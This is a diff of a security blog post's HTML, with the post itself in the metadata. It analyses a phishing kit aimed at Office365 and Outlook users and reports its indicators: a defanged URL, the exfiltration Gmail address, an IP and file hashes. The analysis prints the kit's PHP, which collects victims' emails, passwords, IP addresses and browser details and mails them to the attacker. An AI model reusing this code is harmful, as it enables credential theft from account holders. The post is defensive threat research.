@@ -1,555 +1,621 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" dir="auto">
 
-    <head>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<meta http-equiv="Content-Language" content="en">
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Phishing findings, campaign #1: u.zip (Office365/Outlook) | andpalmier</title>
+<meta name="keywords" content="phishing, phishingkit, outlook, office365">
+<meta name="description" content="Analysis of a phishing kit targeting Outlook and Office365 users">
+<meta name="author" content="">
+<link rel="canonical" href="https://andpalmier.com/posts/phishing-findings-1/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3f372934d1c1362b71cc19fea0df71fd2f6c0538b2e002dcd947350384804cad.css" integrity="sha256-PzcpNNHBNitxzBn&#43;oN9x/S9sBTiy4ALc2Uc1A4SATK0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://andpalmier.com/images/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://andpalmier.com/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://andpalmier.com/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://andpalmier.com/apple-touch-icon.png">
+<link rel="mask-icon" href="https://andpalmier.com/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
 
-	<meta name="author" content="Andrea Palmieri">
-	<meta name="description" content="I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.
-Let&rsquo;s start from the beginning Here is my tweet containing some information about this instance of the kit:
-#phishing #onedrive hxxps://www.bonatura.com/ok.co/u/
-exf: macdon161@gmail
-reg: @GoDaddy 🔐 @letsencrypt ☣️ 63.249.146.86 (AS54489)
-🎯 @onedrive @Microsoft @illegalFawn @ActorExpose @PhishKitTracker @Spam404 @malwrhunterteam @JAMESWT_MHT @ANeilan @sysgoblin @PhishStats pic.">
-	<meta name="keywords" content="blog, infosec, security, cyber security">
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
 
-	<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Phishing findings, campaign #1: u.zip (Office365/Outlook)"/>
-<meta name="twitter:description" content="I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.
-Let&rsquo;s start from the beginning Here is my tweet containing some information about this instance of the kit:
-#phishing #onedrive hxxps://www.bonatura.com/ok.co/u/
-exf: macdon161@gmail
-reg: @GoDaddy 🔐 @letsencrypt ☣️ 63.249.146.86 (AS54489)
-🎯 @onedrive @Microsoft @illegalFawn @ActorExpose @PhishKitTracker @Spam404 @malwrhunterteam @JAMESWT_MHT @ANeilan @sysgoblin @PhishStats pic."/>
+            .list {
+                background: var(--theme);
+            }
 
-	<meta property="og:title" content="Phishing findings, campaign #1: u.zip (Office365/Outlook)" />
-<meta property="og:description" content="I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.
-Let&rsquo;s start from the beginning Here is my tweet containing some information about this instance of the kit:
-#phishing #onedrive hxxps://www.bonatura.com/ok.co/u/
-exf: macdon161@gmail
-reg: @GoDaddy 🔐 @letsencrypt ☣️ 63.249.146.86 (AS54489)
-🎯 @onedrive @Microsoft @illegalFawn @ActorExpose @PhishKitTracker @Spam404 @malwrhunterteam @JAMESWT_MHT @ANeilan @sysgoblin @PhishStats pic." />
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Phishing findings, campaign #1: u.zip (Office365/Outlook)" />
+<meta property="og:description" content="Analysis of a phishing kit targeting Outlook and Office365 users" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/phishing-findings-1/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://andpalmier.com/posts/phishing-findings-1/" /><meta property="og:image" content="https://andpalmier.com/papermod-cover.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-05-26T00:00:00+00:00" />
 <meta property="article:modified_time" content="2020-05-26T00:00:00+00:00" />
 
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://andpalmier.com/papermod-cover.png"/>
+
+<meta name="twitter:title" content="Phishing findings, campaign #1: u.zip (Office365/Outlook)"/>
+<meta name="twitter:description" content="Analysis of a phishing kit targeting Outlook and Office365 users"/>
 
 
-	
-	<base href="/posts/phishing-findings-1/">
-	
-	<title>
-  Phishing findings, campaign #1: u.zip (Office365/Outlook) · andpalmier
-</title>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Posts",
+      "item": "https://andpalmier.com/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Phishing findings, campaign #1: u.zip (Office365/Outlook)",
+      "item": "https://andpalmier.com/posts/phishing-findings-1/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Phishing findings, campaign #1: u.zip (Office365/Outlook)",
+  "name": "Phishing findings, campaign #1: u.zip (Office365\/Outlook)",
+  "description": "Analysis of a phishing kit targeting Outlook and Office365 users",
+  "keywords": [
+    "phishing", "phishingkit", "outlook", "office365"
+  ],
+  "articleBody": " I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.\nLet’s start from the beginning Here is my tweet containing some information about this instance of the kit:\n#phishing #onedrive hxxps://www.bonatura.com/ok.co/u/\nexf: macdon161@gmail\nreg: @GoDaddy 🔐 @letsencrypt ☣️ 63.249.146.86 (AS54489)\n🎯 @onedrive @Microsoft @illegalFawn @ActorExpose @PhishKitTracker @Spam404 @malwrhunterteam @JAMESWT_MHT @ANeilan @sysgoblin @PhishStats pic.twitter.com/zbFwmBWEvm\n— Andrea Palmieri🤌 (@andpalmier) May 22, 2020 We can clearly see from the second screenshot that the zip containing the phishing kit is left exposed, thus we can download it and check it on VirusTotal using the hash of the zip:\n$ sha256sum u.zip c9079c6f6576da99f979b637c358a45f89c7187ddb80edf9e7fb2d9500880173 u.zip u.zip on VirusTotal\nExplore the kit When extracting the archive, we can see the following structure:\nu ├── aol.php ├── css │ ├── bootstrap.min.css │ └── style.css ├── emailcode │ └── email.php ├── images │ ├── landing-devices-bg.jpg │ ├── mail.png │ ├── microbg.jpg │ ├── microsoftlogo.png │ ├── mobile-img.png │ ├── officebg.jpg │ ├── officelogo.png │ ├── office.png │ ├── Onedrive-logo.png │ ├── outlook.png │ └── webmaillogo.png ├── index.php ├── js │ └── bootstrap.min.js ├── microsoft.php ├── office.php ├── outlookcode │ └── email.php └── webmail.php I usually start the analysis from the entrypoint: so, in this case, index.php. If we look at the div having the class loginform, we can find an interesting feature of this kit: it gives the user three options to login (Office365, Outlook and ‘other mail’).\nHere is how it looks in the code and in the browser:\n\u003cdiv class=\"loginform\"\u003e \u003ca href=\"office.php\" class=\"loginoffice\"\u003eLogin with Office 365\u003c/a\u003e \u003ca href=\"microsoft.php\" class=\"loginoutlook\"\u003eLogin with Outlook\u003c/a\u003e \u003ca href=\"webmail.php\" class=\"loginmail\"\u003eLogin with Other Mail\u003c/a\u003e \u003c/div\u003e How this phishing kit looks like when deployed\nExfiltration method The three PHP files referenced from index.php all include emailcode/email.php in the action of the form containing input fields for the credentials. Here is the form in one of them, specifically webmail.php:\n\u003cform name=\"webmail\" methed=\"post\" action=\"emailcode/email.php\"\u003e \u003cdiv class=\"form-group orangeclr\"\u003e \u003clabel for=\"email\"\u003eEmail Address\u003c/label\u003e \u003cdiv class=\"input-group mb-2 mr-sm-2 mb-sm-0\"\u003e \u003cdiv class=\"input-group-addon\" style=\"width: 2.6rem\"\u003e \u003ci class=\"fa fa-at\"\u003e\u003c/i\u003e \u003c/div\u003e \u003cinput type=\"text\" name=\"email\" class=\"form-control\" id=\"email\" placeholder=\"you@example.com\" required autofocus\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"form-group orangeclr\"\u003e \u003clabel class=\"\" for=\"password\"\u003ePassword\u003c/label\u003e \u003cdiv class=\"input-group mb-2 mr-sm-2 mb-sm-0\"\u003e \u003cdiv class=\"input-group-addon\" style=\"width: 2.6rem\"\u003e \u003ci class=\"fa fa-key\"\u003e\u003c/i\u003e \u003c/div\u003e \u003cinput type=\"password\" name=\"password\" class=\"form-control\" id=\"password\" placeholder=\"Password\" required\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"gostepbtn\"\u003e \u003cinput type=\"submit\" name=\"submit_btn\" value=\"Go to step 2\" class=\"gostep\" /\u003e \u003c/div\u003e \u003c/form\u003e After the victim enters the credentials, these are sent to emailcode/email.php with a POST. Let’s check what happens in there:\n\u003c?php if(isset($_REQUEST['submit_btn'])){ $admin_email = \"macdon161@gmail.com\"; $email = $_REQUEST['email']; $password = $_REQUEST['password']; $ip = getenv(\"REMOTE_ADDR\"); $country = ip_visitor_country(); $region = ip_visitor_region(); $city = ip_visitor_city(); $adddate = date(\"D M d, Y g:i a\"); $browser = $_SERVER['HTTP_USER_AGENT']; admin_email contains the exfiltration email address for this instance of the phishing kit. So we can confirm that information is sent directly via email to the address specified in the variable.\nAs it is possible to see in the code above, the email sent includes multiple information: credentials, IP address, date and User-Agent string. The kit also tries to obtain the country, region and city where the request was generated by performing a request to geoplugin.net with curl_init and providing the IP address. However - as of now - the service has moved to geoplugin.com, thus these information cannot currently be collected by the kit.\n\u003c?php // Always set content-type when sending HTML email $formname = $_REQUEST['logintype']; switch ($formname) { case \"office\": $message .= \"Login Type Selection -- Office \\n\"; $subject = \"Office login attempt -- \".$ip; break; case \"outlook\": $message .= \"Login Type Selection -- Outlook \\n\"; $subject = \"Outlook login attempt -- \".$ip; break; case \"webmail\": $message .= \"Login Type Selection -- Webmail \\n\"; $subject = \"Webmail login attempt -- \".$ip; break; default: $message .= \"Login Type Selection -- other \\n\"; $subject = \"other login attempt -- \".$ip; } Using a switch, the kit detects which type of credentials were submitted by the phished user, and it changes the message and the subject of the email accordingly.\nIn the rest of the code the headers and body of the email are set, then the email is sent using mail(). After that, the user is redirected to a login page of Microsoft: https://login.microsoftonline.com/common/oauth2.\n\u003c?php $from = 'Outlook '; // To send HTML mail, the Content-type header must be set $headers = 'MIME-Version: 1.0' . \"\\r\\n\"; $headers .= 'Content-type: text/html; charset=iso-8859-1' . \"\\r\\n\"; // Create email headers $headers .= 'From: '.$from.\"\\r\\n\". 'Reply-To: '.$from.\"\\r\\n\" . 'X-Mailer: PHP/' . phpversion(); $headers .= \"MIME-Version: 1.0\" . \"\\r\\n\"; $headers .= \"Content-Type: text/html; charset=ISO-8859-1\\r\\n\"; // More headers $headers .= \"Reply-To: \". strip_tags($email) . \"\\r\\n\"; $message .= \"Username/Email -- $email\\n\"; $message .= \"Password -- $password\\n\"; $message .= \"IP -- \".$ip.\"\\n\"; $message .= \"Country Detected -- \".$country.\"\\n\"; $message .= \"Region Detected -- \".$region.\"\\n\"; $message .= \"City Detected -- \".$city.\"\\n\"; $message .= \"Date -- \".$adddate.\"\\n\"; $message .= \"Browser Detected -- \".$browser.\"\\n\"; //send email @mail($admin_email,$subject,$message); header('Location: https://login.microsoftonline.com/common/oauth2'); Other php files At this point, the workflow of the kit seems clear, however there are two php files that seem unrelated with the rest of the kit, because they are never called or included: outlookcode/email.php and aol.php.\noutlookcode/email.php This file seems to have the same purpose of emailcode/email.php, but is less sophisticated, as it does not contain the switch case to handle multiple phishing pages. Here is the code:\n\u003c?php if(isset($_REQUEST['submit_btn'])){ $admin_email = \"macdon161@gmail.com\"; $email = $_REQUEST['email']; $password = $_REQUEST['password']; // $headers = \"From:\".$email; // Always set content-type when sending HTML email $headers = \"MIME-Version: 1.0\" . \"\\r\\n\"; $headers .= \"Content-type:text/html;charset=UTF-8\" . \"\\r\\n\"; // More headers $headers .= 'From:'.$email . \"\\r\\n\"; $subject = 'Recived data'.$email; $headers = \"From: \" . strip_tags($email) . \"\\r\\n\"; $headers .= \"Reply-To: \". strip_tags($email) . \"\\r\\n\"; $headers .= \"MIME-Version: 1.0\\r\\n\"; $headers .= \"Content-Type: text/html; charset=ISO-8859-1\\r\\n\"; $message = ''; $message .= 'Username: '.$email.'\n'; $message .= 'Password: '.$password.'\n'; $message .= ''; //send email if(mail($admin_email, $subject, $message, $headers )){ header('Location: https://login.microsoftonline.com/common/oauth2'); } } //if \"email\" variable is not filled out, display the form Considering that the exfiltration email is included also here, I assume that this is just the code of an old version of the kit that was left in the zip by mistake… But who knows? 🤷\naol.php If we manually navigate to aol.php with our browser, we see the following:\nScreenshot of aol.php\nIt seems another phishing page, this time for an app which has email capabilities.\nInteracting with the page, we can notice that ‘Forgot Password?’, ‘Get a Free Username’ and ‘Erase Hard Drive Junk Now’ are not working, and the same applies to the ‘GET THE AOL APP’ button. In the source code, they all have the href attribute equal to javascript:void(0).\nAOL apps for iPhone and Android\nHere is the form:\n\u003c?php require_once('emailcode/email.php') ?\u003e // SKIPPING NOT INTERESTING HTML \u003cform class=\"needs-validation\" method=\"post\" action=\"\" novalidate\u003e \u003cdiv class=\"form-group\"\u003e \u003cinput type=\"Email\" class=\"form-control\" id=\"validationCustom01\" placeholder=\"Email\" required\u003e \u003cdiv class=\"invalid-feedback\"\u003e Enter Email Address \u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"form-group\"\u003e \u003cinput type=\"password\" class=\"form-control\" id=\"validationCustom02\" placeholder=\"Password\" required\u003e \u003cdiv class=\"invalid-feedback\"\u003e Enter Password \u003c/div\u003e \u003c/div\u003e \u003ca href=\"javascript:void(0);\" class=\"forgotBtn\"\u003eForgot Password?\u003c/a\u003e \u003cbutton class=\"btn stepBtn\" type=\"submit\"\u003eGo to step 2\u003c/button\u003e \u003cdiv class=\"get-user\"\u003e \u003cspan\u003e\u003ca href=\"javascript:void(0);\"\u003eGet a Free Username\u003c/a\u003e\u003c/span\u003e \u003ca href=\"javascript:void(0);\"\u003eErase Hard Drive Junk Now\u003c/a\u003e \u003c/div\u003e \u003c/form\u003e As for the other phishing pages of the kit, emailcode/email.php is imported also here. However, in this case, the action attribute of the form is empty; thus the php code will not be able to process the credentials of the victims.\nThe file is clear according to VirusTotal:\naol.php on VirusTotal\nWhat about the other files? We can check the VirusTotal detections of all the files using the sha256 hash:\n$ find . -type f | xargs sha256sum e7ed36ceee5450b4243bbc35188afabdfb4280c7c57597001de0ed167299b01b ./js/bootstrap.min.js 2777abe0312e6b49428d5d7f7f42e43af620793f86f823f2e045968afbdddb63 ./images/microbg.jpg 2ebc65a696544b8d69ade5f136250a9548d4badf1b9ad459e63ff68e7a985c69 ./images/mail.png 17f02fdb590800c9a21e2b6166f5f22cc54952d58897f09d8e82bb9195bc2071 ./images/outlook.png 089aa7fa65a4038b4ab9130d083e6bcc24b0e33f5018984ef1463b8516bc7993 ./images/microsoftlogo.png e298d32d99708f56d68ef9cd0c44ec85910a4df7552b5b2041fcaa48d5ee9742 ./images/webmaillogo.png efaccc2b190fcce0f0ab41064d882fb4a701c6aed6b1035595a16138e32a0a50 ./images/officelogo.png 6adc34b6d4d872e313e0857063eac568a489ab092ff0f15834a2559043c9c1e2 ./images/mobile-img.png c86c4a6731077f1994a8caeccb1fc06477ea35a5b6abbb4abde1d06b8ef9ff32 ./images/landing-devices-bg.jpg 4603ea1b2f9df0c9d4f2a253c550ffbaf27ea2cb53ecde4277b2acf9dde33979 ./images/Onedrive-logo.png 1500514adf9e666a3d20530815df881bc94812c6906a53bd4c216d051d18c372 ./images/office.png 7a2c0b0e1e16041b12dd1a7d18438ceb14063c980799baee1d55cb2f04892777 ./images/officebg.jpg 84f1d1ffdc036768ffeba1be92362dcf619e7ce6ec27500ab47844ed24fc4230 ./index.php 0b09beb179bd176c93c443175940777332cf57ac9e4487ea9088ae21e3c6d032 ./microsoft.php 8979f584623e4307a42bd008d755c35456af8cb96bec89dd4fbec47036e20184 ./css/style.css 2c0f3dcfe93d7e380c290fe4ab838ed8cadff1596d62697f5444be460d1f876d ./css/bootstrap.min.css c60bd69cdc08032d32898d4d3f7648a5370f15720b58b51af77a4ecd72799bc3 ./webmail.php e5a35da055cf9b0cf6d4cfbd2d0e8be75ebdc56949740c5e767f12915e6174eb ./office.php 085f5dfb1f89bd983c58e618a95bf7bdaa872bee4a126495ec3e7cf421bb9fc2 ./aol.php 3234d6c03d185864d6537178a4d1e44c5277c9115f11b07f9c5be0517ebc51a7 ./emailcode/email.php d6083dcb3385f93916f63b6e50d28791a51842d38bd507bcad7b731b7b33009d ./outlookcode/email.php Here are the detections of index.php, microsoft.php, office.php and webmail.php on VirusTotal as of today.\nindex.php, microsoft.php, office.php and webmail.php on VirusTotal\nNo matches were found for emailcode/email.php and outlookcode/email.php. All the other files were flagged as ‘Undetected’ by all the engines on VirusTotal.\nConclusion In this post, we analyzed u.zip, a phishing kit found online which tricks victims into giving their credentials using 3 templates: one for Office365, one for Outlook and one for other email services (with a cPanel theme).\nSchema of the phishing kit\nThe templates redirect the credentials to emailcode/email.php, which tries to gather additional information and writes them into an email, that is sent to the exfiltration email address. At the end of the execution, the victim is redirected to login.microsoftonline.com.\n",
+  "wordCount" : "1437",
+  "inLanguage": "en",
+  "datePublished": "2020-05-26T00:00:00Z",
+  "dateModified": "2020-05-26T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://andpalmier.com/posts/phishing-findings-1/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "andpalmier",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://andpalmier.com/images/favicon-32x32.png"
+    }
+  }
+}
+</script>
+</head>
 
-	
-	<link rel="canonical" href="/posts/phishing-findings-1/">
-	
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
 
-	<link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
-	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css" integrity="sha384-Bfad6CLCknfcloXFOyFnlgtENryhrpZCe29RTifKEixXQZ38WheV+i/6YWSzkz3V" crossorigin="anonymous">
-	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+</script>
 
-	
-	
-	
-	<link rel="stylesheet" href="/css/coder.min.d5c572a4dda2996f45f4bd9e584d43751439ce2134c33701e8d32920cc8e7d92.css" integrity="sha256-1cVypN2imW9F9L2eWE1DdRQ5ziE0wzcB6NMpIMyOfZI=" crossorigin="anonymous" media="screen" />
-	
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://andpalmier.com" accesskey="h" title="andpalmier (Alt + H)">andpalmier</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://andpalmier.com/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://andpalmier.com/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
 
-	
-
-	
-	
-	
-	
-	<link rel="stylesheet" href="/css/coder-dark.min.58ba09b2c45d36fcfc1a96c8ad83bbbc03a9de4bce8463f3c30a896134febfb3.css" integrity="sha256-WLoJssRdNvz8GpbIrYO7vAOp3kvOhGPzwwqJYTT&#43;v7M=" crossorigin="anonymous" media="screen" />
-	
-	
-
-	
-	<link rel="stylesheet" href="/css/extra-style.css" />
-	
-
-	
-
-	<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
-	<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
-
-	
-
-	<meta name="generator" content="Hugo 0.106.0">
-    </head>
-
+<article class="post-single">
+  <header class="post-header">
     
-    
-    
-    
-    <body class="colorscheme-dark"
+    <h1 class="post-title">
+      Phishing findings, campaign #1: u.zip (Office365/Outlook)
+    </h1>
+    <div class="post-meta"><span title='2020-05-26 00:00:00 +0000 UTC'>May 26, 2020</span>&nbsp;·&nbsp;7 min
 
-	  onload=""
-	  >
-	  
-<div class="float-container">
-    <a id="dark-mode-toggle" class="colorscheme-toggle">
-        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
-    </a>
 </div>
-
-
-	  <main class="wrapper">
-	      <nav class="navigation">
-  <section class="container">
-    <a class="navigation-title" href="/">
-      andpalmier
-    </a>
-    
-    <input type="checkbox" id="menu-toggle" />
-    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
-    <ul class="navigation-list">
-      
-        
-          <li class="navigation-item">
-            <a class="navigation-link" href="/">Home</a>
-          </li>
-        
-          <li class="navigation-item">
-            <a class="navigation-link" href="/about/">About</a>
-          </li>
-        
-      
-      
-    </ul>
-    
-  </section>
-</nav>
-
-
-	      <div class="content">
-		  
-  <section class="container post">
-    <article>
-      <header>
-        <div class="post-title">
-          <h1 class="title">Phishing findings, campaign #1: u.zip (Office365/Outlook)</h1>
-        </div>
-        <div class="post-meta">
-          <div class="date">
-            <span class="posted-on">
-              <i class="fas fa-calendar"></i>
-              <time datetime='2020-05-26T00:00:00Z'>
-                May 26, 2020
-              </time>
-            </span>
-            <span class="reading-time">
-              <i class="fas fa-clock"></i>
-              7-minute read
-            </span>
-          </div>
-          <div class="categories">
-  <i class="fas fa-folder"></i>
-    <a href="/categories/phishing/">phishing</a></div>
-
-          <div class="tags">
-  <i class="fas fa-tag"></i>
-    <a href="/tags/phishing/">phishing</a>
-      <span class="separator">•</span>
-    <a href="/tags/phishingkit/">phishingkit</a>
-      <span class="separator">•</span>
-    <a href="/tags/office365/">office365</a></div>
-
-        </div>
-      </header>
-
-      <div>
-        
-        <figure><img src="/images/posts/phishing-findings/sampei.jpeg"/>
+  </header> 
+  <div class="post-content"><figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/sampei.jpeg#center"
+         alt="Sampei"/> 
 </figure>
 
-<p>I started hunting and reporting phishing websites on Twitter: follow me <a href="https://twitter.com/andpalmier">here</a> if you are interested!
+<p>I started hunting and reporting phishing websites on Twitter: follow me <a href="https://twitter.com/andpalmier" target="_blank" rel="noopener">here</a> if you are interested!
 In this series of posts I am going to analyze and discuss some of the phishing kits found online.</p>
-<h2 id="lets-start-from-the-beginning">Let&rsquo;s start from the beginning</h2>
+<h2 id="lets-start-from-the-beginning">Let&rsquo;s start from the beginning<a hidden class="anchor" aria-hidden="true" href="#lets-start-from-the-beginning">#</a></h2>
 <p>Here is my tweet containing some information about this instance of the kit:</p>
-<blockquote class="twitter-tweet"><p lang="en" dir="ltr"><a href="https://twitter.com/hashtag/phishing?src=hash&amp;ref_src=twsrc%5Etfw">#phishing</a> <a href="https://twitter.com/hashtag/onedrive?src=hash&amp;ref_src=twsrc%5Etfw">#onedrive</a>  <br>hxxps://www.bonatura.com/ok.co/u/<br><br>exf: macdon161@gmail<br>reg: <a href="https://twitter.com/GoDaddy?ref_src=twsrc%5Etfw">@GoDaddy</a> <br>🔐 <a href="https://twitter.com/letsencrypt?ref_src=twsrc%5Etfw">@letsencrypt</a> <br>☣️ 63.249.146.86 (AS54489)<br>🎯 <a href="https://twitter.com/onedrive?ref_src=twsrc%5Etfw">@onedrive</a> <a href="https://twitter.com/Microsoft?ref_src=twsrc%5Etfw">@Microsoft</a> <br> <a href="https://twitter.com/illegalFawn?ref_src=twsrc%5Etfw">@illegalFawn</a> <a href="https://twitter.com/ActorExpose?ref_src=twsrc%5Etfw">@ActorExpose</a> <a href="https://twitter.com/PhishKitTracker?ref_src=twsrc%5Etfw">@PhishKitTracker</a> <a href="https://twitter.com/Spam404?ref_src=twsrc%5Etfw">@Spam404</a> <a href="https://twitter.com/malwrhunterteam?ref_src=twsrc%5Etfw">@malwrhunterteam</a> <a href="https://twitter.com/JAMESWT_MHT?ref_src=twsrc%5Etfw">@JAMESWT_MHT</a> <a href="https://twitter.com/ANeilan?ref_src=twsrc%5Etfw">@ANeilan</a> <a href="https://twitter.com/sysgoblin?ref_src=twsrc%5Etfw">@sysgoblin</a> <a href="https://twitter.com/PhishStats?ref_src=twsrc%5Etfw">@PhishStats</a> <a href="https://t.co/zbFwmBWEvm">pic.twitter.com/zbFwmBWEvm</a></p>&mdash; Andrea Palmieri🤌 (@andpalmier) <a href="https://twitter.com/andpalmier/status/1263931978954485763?ref_src=twsrc%5Etfw">May 22, 2020</a></blockquote>
+<blockquote class="twitter-tweet" data-dnt="true"><p lang="en" dir="ltr"><a href="https://twitter.com/hashtag/phishing?src=hash&amp;ref_src=twsrc%5Etfw">#phishing</a> <a href="https://twitter.com/hashtag/onedrive?src=hash&amp;ref_src=twsrc%5Etfw">#onedrive</a>  <br>hxxps://www.bonatura.com/ok.co/u/<br><br>exf: macdon161@gmail<br>reg: <a href="https://twitter.com/GoDaddy?ref_src=twsrc%5Etfw">@GoDaddy</a> <br>🔐 <a href="https://twitter.com/letsencrypt?ref_src=twsrc%5Etfw">@letsencrypt</a> <br>☣️ 63.249.146.86 (AS54489)<br>🎯 <a href="https://twitter.com/onedrive?ref_src=twsrc%5Etfw">@onedrive</a> <a href="https://twitter.com/Microsoft?ref_src=twsrc%5Etfw">@Microsoft</a> <br> <a href="https://twitter.com/illegalFawn?ref_src=twsrc%5Etfw">@illegalFawn</a> <a href="https://twitter.com/ActorExpose?ref_src=twsrc%5Etfw">@ActorExpose</a> <a href="https://twitter.com/PhishKitTracker?ref_src=twsrc%5Etfw">@PhishKitTracker</a> <a href="https://twitter.com/Spam404?ref_src=twsrc%5Etfw">@Spam404</a> <a href="https://twitter.com/malwrhunterteam?ref_src=twsrc%5Etfw">@malwrhunterteam</a> <a href="https://twitter.com/JAMESWT_MHT?ref_src=twsrc%5Etfw">@JAMESWT_MHT</a> <a href="https://twitter.com/ANeilan?ref_src=twsrc%5Etfw">@ANeilan</a> <a href="https://twitter.com/sysgoblin?ref_src=twsrc%5Etfw">@sysgoblin</a> <a href="https://twitter.com/PhishStats?ref_src=twsrc%5Etfw">@PhishStats</a> <a href="https://t.co/zbFwmBWEvm">pic.twitter.com/zbFwmBWEvm</a></p>&mdash; Andrea Palmieri🤌 (@andpalmier) <a href="https://twitter.com/andpalmier/status/1263931978954485763?ref_src=twsrc%5Etfw">May 22, 2020</a></blockquote>
 <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
 
 <p>We can clearly see from the second screenshot that the zip containing the phishing kit is left exposed, thus we can download it and check it on VirusTotal using the hash of the zip:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sha256sum u.zip
-</span></span><span style="display:flex;"><span>c9079c6f6576da99f979b637c358a45f89c7187ddb80edf9e7fb2d9500880173  u.zip
-</span></span></code></pre></div><figure><img src="/images/posts/phishing-findings/ep1/vtuzip.png"
-         alt="u.zip on VirusTotal"/><figcaption>
-            <p><a href="https://www.virustotal.com/gui/file/c9079c6f6576da99f979b637c358a45f89c7187ddb80edf9e7fb2d9500880173/detection">u.zip on VirusTotal</a></p>
